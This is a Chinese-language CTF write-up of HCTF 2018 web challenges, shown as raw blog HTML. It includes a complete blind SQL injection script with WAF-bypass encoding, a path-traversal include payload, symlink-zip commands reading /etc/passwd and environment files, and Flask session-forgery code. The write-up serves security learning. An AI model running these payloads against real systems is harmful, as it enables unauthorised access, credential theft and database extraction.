class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>可以知道emmm中的checkFile有变量将$_GET[‘file’]以”?”为分隔符分为几部分，只要在”?”前的变量在白名单中就可以返回true。<br>结合提示”flag not here, and flag in ffffllllaaaagggg”,构造file=hint.php?../../../../../ffffllllaaaagggg拿到flag。</p><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>这道题正解应该是通过Unicode字符来注册一个在执行strlower函数后用户名为admin的账户从而获得flag。<br>我们先是在change下看到了注释，去GitHub上拿到源码（听说有队伍直接在GitHub上搜索就搜索到了）。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin02.png" alt=""><br>在tamplates/index.html 下可以看到只要session[‘name’] == ‘admin’ 就可以看到flag。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin03.png" alt="">我的第一直觉是伪造session来获得admin的登录态，这是出题人的非预期吧，稍后讲。<br>在app/routes.py的第41,63和84行的注册，登录和更改密码处发现了strlower函数。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin04.png" alt=""><br>随后在第106行发现strlower的定义。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin05.png" alt=""><br>在注册的时候将用户名strlower带入数据库查询，登录的时候也使用strlower查询，而登录之后更改密码又再一次使用了strlower，<b>也就是说登录之后的用户名会进行两次strlower</b>。这就导致了某些形如字母的Unicode字符在经过strlower变成字母，第二次strlower之后变为小写字母。<br>举个例子，”\u1d2c”经过Unicode解码之后变为”ᴬ”，我们注册一个名为ᴬdmin的用户，在登录的时候session[‘name’]变为”Admin”，在修改密码的时候又变为”admin”，这使得我们可以越权修改admin的密码，修改完后登录上去就可以看到flag。(这个漏洞目前在新版本的Twisted中已被修复)<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin01.png" alt=""><br>再来谈谈session伪造。由于出题人的疏忽，不小心在源码中泄露了SECRET_KEY。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin06.png" alt=""><br>这就导致可以通过本地构造session来构造admin的登录态。这和hideandseek有异曲同工之妙，将在后面仔细讲解。</p><h1 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h1><p>一道由Li4n0从钓鱼网站源码中修改代码而成的题目。<br>随便扫扫目录，发现&#119;ww.zip，就自己在本地搭了个环境，查看login.php发现使用了addslashes函数，但需要绕过safe.php中的waf<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>waf把能所有东西都过滤了，并且在login.php中还判断了数据库中的用户名和输入的用户名是否相等，导致post注入被堵死。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone02.png" alt=""><br>再次审计一下代码发现admin目录下的除login.php外都是由一个islogin变量来判断是否登录，<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone01.png" alt="">全局搜索一下发现islogin变量在/include/member.php中。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone03.png" alt="">我们看到了熟悉的json_decode还有双等号！在本次环境测试了一下发现<b>在输入Unicode编码的时候，json_decode会自动还原成字符</b>，这样我们既绕过了waf，又达到注入的目的，这个我们稍后再说。<br>先来讲讲下面的弱类型，我们可以通过发送cookie的login_data模拟admin登录态，并且我们知道服务器有admin用户但不知道admin密码，由于这个弱类型，我们可以通过number == $admin_pass的前几位来模拟登陆，使用burp最后跑出来的数字是65，也就是只要构造<br><code>login_data={&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:65}</code><br>就可以登陆后台系统。<b>但直接跑数字的话存在一个问题。</b>既当sha1($udata[‘password’] . LOGIN_KEY)中出现形如65e123a….之类的字符串时，那admin_pass就必须为65e123(e为科学计数法)。这点在我本地构造环境时让我频频出错，好在出题人并没有为难我们，毕竟这个脚本也不好跑。<br>登录后台后发现flag不在后台中，想想应该是在数据库中。现在讲讲注入。刚才讲过，json_decode会还原Unicode编码，并且waf里刚好没有过滤掉’/‘，在本地创个测试环境。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'login_data'</span>]))</span><br><span class="line">&#123;       </span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        var_dump($login_data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone04.png" alt=""><br>我们发现json_decode确实将Unicode编码还原成字符，接下来就好办了，在代码中如果没有查询到的话就会有四次setcookie，如果查询到就只有两次setcookie，或者根据弱类型跑出来的密码来判断是否登录，因此可以采用布尔盲注；当然也可以使用时间盲注，这里我采用布尔盲注。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/list.php"</span></span><br><span class="line">chars = [chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>)]</span><br><span class="line">table = []</span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = s.replace(<span class="string">' '</span>, <span class="string">"/**/"</span>).replace(<span class="string">"substr"</span>,<span class="string">"\\u0073ubstr"</span>).replace(<span class="string">"="</span>, </span><br><span class="line">    <span class="string">"\\u003d"</span>).replace(<span class="string">"ascii"</span>, <span class="string">"\\u0061scii"</span>).replace(<span class="string">"or"</span>,<span class="string">"\\u006fr"</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> database</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select database()),&#123;&#125;,1))=%27&#123;&#125;\",\"admin_pass\":65"</span></span><br><span class="line">            payload = <span class="string">"&#123;"</span> + payload.format(str(i),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">            payload = enc(payload)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">            &#125;</span><br><span class="line">            html = r.get(url,headers=headers)</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                database += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"database: "</span> + database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> table</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">                payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=%27&#123;2&#125;\",\"admin_pass\":65"</span></span><br><span class="line">                payload = <span class="string">"&#123;"</span> + payload.format(str(i),str(j),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">                payload = enc(payload)</span><br><span class="line">                headers = &#123;</span><br><span class="line">                    <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">                &#125;</span><br><span class="line">                html = r.get(url, headers=headers)</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                    table_name += char</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table.append(table_name)</span><br><span class="line">    print(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select * from F1444g),&#123;0&#125;,1))=%27&#123;1&#125;\",\"admin_pass\":65"</span></span><br><span class="line">            payload = <span class="string">"&#123;"</span> + payload.format(str(i),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">            payload = enc(payload)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">            &#125;</span><br><span class="line">            html = r.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                flag += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_database()</span><br><span class="line">    get_table()</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><br>没有使用多线程跑起来真的慢，下次整理一篇多线程的文章。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone05.png" alt=""></p><h1 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h1><p><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek01.png" alt=""><br>需要上传zip文件，上传随意文件发现没有啥卵用，想到前几个月某场比赛的一道题，随即试试上传软连接文件。<br>在linux下执行<br><code>ln -s /etc/passwd link</code>和<code>zip -y 1.zip link</code>上传后得到passwd文件，拿到一个任意文件读取。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek02.png" alt=""><br>出题人第二天给了提示docker，读取下/proc/self/environ的环境变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=30b76592807cSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><br>找到了web服务器，读取/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure><br>这里/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py是运行中的文件，拿来看看<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, redirect, url_for, escape, request, Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.form[<span class="string">'username'</span>]</span><br><span class="line">    password = request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span> + extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><br>读取/app/hard_t0_guess_n9f5a95b5ku9fg/flag.py发现不是admin无法读取。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek03.png" alt=""><br>转换思路，读取/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html看看，发现主页变为<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek04.png" alt=""><br>在代码第40行得知admin无法登陆，所以又是伪造session来获得admin的登录态。从main.py可以知道secret是随机数，而随机数的种子是uuid.getnode()，也就是mac地址，可以从/sys/class/net/eth0/address来获取，得到12:34:3e:14:7c:62，在python3的环境下伪造session，将session放回网站拿到flag。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">20015589129314</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session.permanent = <span class="keyword">True</span>  </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> session.get(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure><br>访问/get/查看session放回原网站拿到flag<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek05.png" alt=""></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>一道很新颖的题目。可以随意注册，注册完之后在user.php可以进行排序，order可以等于id,username,sex,score,没有发现注入点。经过提示，尝试order=password发现可以排序，我们可以因此通过不断比较密码得到admin的密码。并且注册两个号后比较发现是降序排列。<br>例如注册一个密码为d的用户，在密码排序下发现在admin下面，注册一个密码为e的用户，在admin的上面，可以推断出admin的第一位密码是d，按照这样使用脚本爆破出admin的密码，登录访问flag.php即可得到flag。<br><img 